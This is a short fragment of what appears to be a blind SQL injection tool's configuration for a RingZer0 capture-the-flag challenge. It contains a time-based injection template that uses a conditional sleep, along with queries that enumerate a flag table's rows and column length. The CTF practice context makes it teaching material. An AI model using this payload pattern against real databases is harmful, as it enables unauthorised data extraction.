...
url = "http://challenges.ringzer0team.com:20013/chal13.php"
requestType = post
...
injectionCount = "';SELECT 1 FROM dual WHERE IF( (({query}))>{charCodeOrCount}, ({sleeper}), 1337);"
...
# FOUND : suchFlagMuchTime::flag

sqlNbRows = "SELECT COUNT(*) FROM suchFlagMuchTime"
sqlLengthColumnName = "SELECT LENGTH(flag) " \
                      "FROM suchFlagMuchTime "\
                      "LIMIT {offset},1"
